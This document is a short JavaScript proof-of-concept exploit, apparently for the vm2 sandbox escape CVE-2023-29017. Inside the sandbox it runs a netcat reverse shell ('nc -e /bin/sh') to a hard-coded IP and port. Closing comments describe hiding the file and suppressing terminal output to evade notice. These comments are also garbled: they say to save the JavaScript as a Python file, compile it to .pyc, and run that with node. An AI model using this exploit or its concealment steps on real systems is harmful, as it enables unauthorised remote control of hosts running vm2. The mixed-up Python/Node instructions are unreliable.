// PoC for CVE-2023-29017 with reverse shell

const vm = require('vm2');
const sandbox = new vm.VM({
    timeout: 1000,
    sandbox: {}
});
sandbox.run(`
    const { exec } = require('child_process');
    Error.prepareStackTrace = function (err, stack) {
        exec('nc -e /bin/sh 192.168.1.10 4444'); // change IP and port as needed
        return stack;
    };
    async function foo() {
        await Promise.reject();
    }
    foo();
`);

// Save this code as poc.py and compile it to poc.pyc using py_compile module
// python -m py_compile poc.py

// Hide the poc.pyc file by adding a dot at the start of its name
// mv poc.pyc .poc.pyc

// Hide the output of the code from the system by using stty flusho command
// stty flusho; node .poc.pyc; stty -flusho
